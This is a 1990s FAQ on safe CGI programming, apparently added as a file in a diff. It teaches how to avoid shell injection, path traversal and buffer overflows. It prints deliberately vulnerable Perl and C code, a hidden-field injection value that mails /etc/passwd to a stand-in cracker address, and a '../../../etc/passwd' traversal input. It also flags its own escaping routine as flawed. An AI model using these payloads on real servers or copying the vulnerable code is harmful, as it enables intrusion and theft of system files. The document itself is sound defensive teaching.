@@ -1,0 +1,348 @@
+
+Safe CGI Programming                          Last updated: 1995-09-03
+----------------------------------------------------------------------
+
+[Note -- the last update of any thoroughness was indeed 1995-09-03.
+However, it turns out people are still using this, so I feel obliged
+to at least correct the glaring errors.  See the section on identifying
+safe characters with regular expressions for an important update.
+Thanks. -- PSP 1997-07-08]
+
+[Updated again 1997-10-27 with a few notes from Dave Andersen.]
+
+Recent exposure of security holes in several widely used CGI packages
+indicates that the existing documents on CGI security have not taken
+hold in the public consciousness.  These scripts are being redistributed
+to people that have no programming experience and no way to determine
+whether they are opening up their servers for attack.  This causes
+considerable frustration for all involved.
+
+This document is intended for the beginning or intermediate
+CGI programmer.  It is by no means a comprehensive analysis of
+the security risks -- its purpose is to help people avoid the
+most common errors.  This document and other CGI security resources
+are available at
+
+<URL:http://www.go2net.com/people/paulp/cgi-security/>
+
+Please send comments on this document to Paul Phillips <paulp@go2net.com>
+
+Q: "Why should I care? The server runs as nobody, right? That means
+you can't do anything dangerous, even if you break a CGI script."
+
+A: Wrong.  Some of the actions that can be taken in various 
+circumstances are:
+
+ 1) Mailing the password file to the attacker (unless shadowed)
+ 2) Mailing a map of the filesystem to the attacker
+ 3) Mailing system information from /etc to the attacker
+ 4) Starting a login server on a high port and telneting in
+ 5) Many denial of service attacks: massive filesytem finds,
+ for example, or other resource consuming commands
+ 6) Erasing and/or altering the server's log files
+
+Another problem is that some sites are running their webservers
+as root.  I CANNOT EMPHASIZE ENOUGH HOW BAD THIS IS.  You are shooting
+yourself in the foot.  Whatever problem inspired you to do this, you
+must solve it in some other manner, or you *will* be compromised in
+the future.
+
+There has been some confusion as to what it means to "run your 
+webserver as root." It is fine to *start* the webserver as root.
+This is necessary to bind to port 80 on Unix systems.  However,
+the webserver should then give away its privileges with a call
+to setuid.  The webserver's configuration file should allow you
+to specify what user it should run as; the default is normally
+"nobody", a generic unprivileged account.  Remember that it is
+irrelevant which account owns the binary, and the program should 
+not have the setuid bit set.
+
+There is a good argument that servers should not actually run as
+"nobody", but rather as a specific UID and GID dedicated to the 
+webserver, such as "www".  This prevents other programs that run
+as "nobody" from interfering with server-owned files.
+
+There is a program called "cgiwrap" <URL:http://www.umr.edu/~cgiwrap>
+that runs CGI scripts under the UID of the person that owns them.  While
+cgiwrap successfully overcomes some problems with CGI scripts, it also
+exacerbates the effect of security holes.  If an attacker can execute
+commands under the user UID, rm -rf ~ is only a few characters long,
+and the user will lose everything.
+
+
+Q: "Now I'm scared, maybe my code is buggy.  Can you show me some
+examples of security holes?"
+
+A: Now you're talking.  The entire philosophy can be summed up as
+"Never trust input data." Most security holes are exploited by 
+sending data to the script that the author of the script did not
+anticipate.  Let's look at some examples.
+
+Foo wants people to be able to send him email via the web.  She
+has several different email addresses, so she encodes an element
+specifying which one so she can easily change it later without 
+having to change the script.  (She needs her sysadmin's permission
+to install or change CGI scripts -- what a hassle!)
+
+<INPUT TYPE="hidden" NAME="FooAddress" VALUE="foo@bar.baz.com">
+
+Now she writes a script called "email-foo", and cajoles the sysadmin
+into installing it.  A few weeks later, Foo's sysadmin calls her back: 
+crackers have broken into the machine via Foo's script! Where did 
+Foo go wrong?
+
+Let's see Foo's mistake in three different languages.  Foo has
+placed the data to be emailed in a tempfile and the FooAddress 
+passed by the form into a variable.  
+
+Perl:
+
+    system("/usr/lib/sendmail -t $foo_address < $input_file");
+
+C: 
+
+    sprintf(buffer, "/usr/lib/sendmail -t %s < %s", foo_address, input_file);
+    system(buffer);
+
+C++:
+    
+    system("/usr/lib/sendmail -t " + FooAddress + " < " + InputFile);
+
+In all three cases, system is forking a shell.  Foo is unwisely 
+assuming that people will only call this script from *her* form, so
+the email address will always be one of hers.  But the cracker copied
+the form to his own machine, and edited it so it looked like this:
+
+<INPUT TYPE="hidden" NAME="FooAddress"
+VALUE="foo@bar.baz.com;mail cracker@bad.com </etc/passwd">
+
+Then he submitted it to Foo's machine, and the rest is history,
+along with the machine.
+
+
+Q: "I never use system.  I guess my scripts are all safe then!"
+
+A: System is not the only command that forks a shell.  In Perl, 
+you can invoke a shell by opening to a pipe, using backticks, or 
+calling exec (in some cases.)
+
+ * Opening to a pipe: open(OUT, "|program $args");
+ * Backticks: `program $args`;
+ * Exec: exec("program $args");
+
+You can also get in trouble in Perl with the eval statement or
+regular expression modifier /e (which calls eval.) That's beyond
+the scope of this document, but be careful.
+
+In C/C++, the popen(3) call also starts a shell.
+
+ * popen("program", "w");
+
+
+
+Q: "What's the right way to do it?"
+
+A: Generally there are two answers: use the data only where it can't
+hurt you, or check it to make sure it is safe.  
+
+*1* Avoid the shell.
+
+  open(MAIL, "|/usr/lib/sendmail -t");
+  print MAIL "To: $recipient\n";
+
+Now the untrusted data is no longer being passed to the shell.  However,
+it is being passed unchecked to sendmail.  In some sense you are trading
+the shell problems for those of the program you are running externally,
+so be sure that it cannot be tricked with the untrusted data!  For example
+if you use /usr/ucb/mail rather than /usr/lib/sendmail, ~-escapes can be
+used (on some versions) to execute commands.  Be wary.
+
+You can use the perl system() and exec() calls without invoking a shell
+by supplying more than one argument:
+
+  system('/usr/games/fortune', '-o');
+
+You can also use open() to achieve an effect similar to popen, but
+without invoking the shell, by performing
+
+  open(FH, '|-') || exec("program", $arg1, $arg2);
+
+*2* Avoid insecure data.
+
+  unless($recipient =~ /^[\w@\.\-]+$/) {
+    # Print out some HTML here indicating failure
+    exit(1);
+  }
+
+This time we're making sure the data is safe for passing to the
+shell.  The example regexp above specifies what is safe rather than 
+what is unsafe.
+
+  if($to =~ tr/;<>*|`&$!#()[]{}:'"//) {
+    # Print out some HTML here indicating failure
+    exit(1);
+  }
+
+Or, to escape metacharacters rather than just detecting them, 
+a subroutine like this could be used:
+
+  sub esc_chars {
+  # will change, for example, a!!a to a\!\!a
+     @_ =~ s/([;<>\*\|`&\$!#\(\)\[\]\{\}:'"])/\\$1/g;
+     return @_;
+  }
+
+[UPDATE! As if to highlight the danger inherent in specifying
+unsafe characters rather than safe, several oversights in the above
+regexp have been pointed out to me.  First, the ^ character (carat)
+acts as a pipe under some shells, and should also be escaped.
+Second, the \n character (newline) is not listed, which could
+delimit shell commands depending on circumstances.  And perhaps
+most worrisome, the shell escape character itself \ (backslash)
+could be present in external input.  If an input stream of
+
+  foo\;bar
+
+were run through the substitution above, it would yield 
+
+  foo\\;bar
+
+once again exposing the ; as a shell metacharacter.  In short,
+pay attention to the paragraph below, it's as true now as it ever
+was.  Note that I *have not* modified the esc_chars routine in
+light of this information, so do not use it as-is.
+
+Update Jul 13 1997: the beat goes on.  The regexp also excludes
+the ? metacharacter (which is almost as dangerous as *) and ASCII
+255, which is treated as a delimiter by some shells.]
+
+These regexps specify what is unsafe.  I believe them to be a complete
+list of potentially dangerous metacharacters, but I have no authoritative
+source to check.  The difference between the latter two regexps and the
+first is the difference between the two security policies "that which is 
+not expressly permitted is forbidden" and "that which is not expressly 
+forbidden is permitted." All security professionals will tell you that the 
+former policy is safer.
+
+For maximum security, use both *1* and *2* where possible.
+
+
+USE PERL TAINT CHECKS: Perl can be very helpful with these problems.
+Invoke it with perl -T to force taint checks; to learn about taint
+checks, see the perl man page.  (The -T option exists only under Perl5.)
+
+DON'T MAKE ASSUMPTIONS ABOUT YOUR ENVIRONMENT:
+Just because cgi-bin programs are traditionally
+executed within the sanitized environment provided by the 
+webserver, on multiuser systems it may be possible for other
+users to execute your cgi-bin programs, or force an execution
+of them in an unexpected context.  To prevent against this,
+cgi-bin programs (especially if they run setuid) should
+sanitize their environments appropriately before spawning
+any shells or invoking any other programs.  At a minimum, set
+the value of the PATH and IFS environment variables to a known
+state:
+   
+        $ENV{"PATH"} = "/bin:/usr/bin:/usr/local/bin";
+        $ENV{"IFS"} = "/";
+ 
+It takes a bit more work, but resetting the environment
+to null using undef() and then building a completely known
+environment is probably a safer way to accomplish this.
+Note that perl in taint-checking mode will warn you if you
+attempt to system() something without first setting your
+path and IFS appropriately.
+
+
+Q: Can I trust user supplied data if there is no shell involved?
+
+A: No.  There are other issues as well.  Consider this perl code fragment:
+
+  open(MANPAGE, "/usr/man/man1/$filename.1");
+
+This is intended to allow HTML access to man pages.  However, what if the
+user supplied filename is
+
+  ../../../etc/passwd
+
+Anytime you are dealing with pathnamess, be sure to check for 
+the .. component.
+
+
+Q: "What else?"
+
+A: In C and C++, improperly allocated memory is vulnerable to 
+buffer overruns.  Perl dynamically extends its data structures to 
+prevent this.  Imagine code like this:
+
+int foo() {
+    char buffer[10];
+
+    strcpy(buffer, get_form_var("feh"));
+    /* etc */
+}
+
+When writing this code, the author certainly expected the value of
+the feh variable to be less than 10 characters.  Unfortunately for
+him, he didn't make sure, and it turned out to be much longer.  This
+means that user data is overwriting the program stack, which in some
+circumstances can be used to invoke commands.
+
+This is very difficult to exploit and you probably will not encounter 
+it.  Still, it's worth mentioning; a very similar hole was found in
+NCSA httpd 1.3 earlier in 1995.  It is poor programming practice not to
+check such things anyway.
+
+Along the same lines, under no circumstances should the C gets() 
+function be used.  It's inherently insecure, as there is no way 
+to specify how large the input buffer is.  Use fgets() on the stdin
+stream instead.
+
+
+Q: "My WWW server doesn't run on a unix platform.  Only unix has all
+these nasty security holes."
+
+A: This may or may not be true.  The author of this document has limited
+experience with servers on other platforms, but he is more than a little
+skeptical that security concerns do not exist.  At the very least, the
+gets() and stack-overflow issues are present on Windows and MacOS as well.
+Specific examples of other CGI dangers on other platforms are welcomed.
+
+Specifics here contributed by Dave Andersen:
+
+  Not only have buffer overflows been found on other platforms, but 
+  glaring security holes in a number of cgi-bin scripts on other platforms
+  (notably Windows) have been found.  Scripting languages such as perl
+  are in common use in Windows-based webservers.  The lack of a telnet
+  port as is found in a UNIX based webserver is no deterrent to an
+  attacker who has under his or her command the full power to execute
+  arbitrary programs on a compromised webserver.
+ 
+  It is very likely that Windows NT webservers will be the targets
+  of the future because they haven't been as thouroughly exploited
+  and tested.  They also make relatively easy targets of
+  denial-of-service attacks, so particular care should be paid
+  by programmers of cgi scripts which run on these machines to
+  avoid serious resource misuse which could present an attacker
+  with a method of disabling the machine.  (Free memory responsibly,
+  always check the length on input data, ensure that in the case
+  of an abnormal termination due to user-supplied input that you
+  always release any resources which you might have).
+
+*Appendix*
+
+Contributions to this document welcomed at <paulp@go2net.com>.
+
+Thanks to those that have contributed to this document:
+
+John Halperin <JXH@SLAC.Stanford.EDU>
+Maurice L. Marvin <maurice@cs.pdx.edu>
+Dave Andersen <angio@aros.net>
+Zygo Blaxell <zblaxell@ezmail.com>
+Joe Sparrow <JSPARROW@UVVM.UVIC.CA>
+Keith Golden <kgolden@cs.washington.edu>
+James W. Abendschan <jwa@jammed.com>
+Jennifer Myers <jmyers@marigold.eecs.nwu.edu>
+Jarle Fredrik Greipsland <jarle@runit.sintef.no>
+David Sacerdote <davids@silence.secnet.com>
+
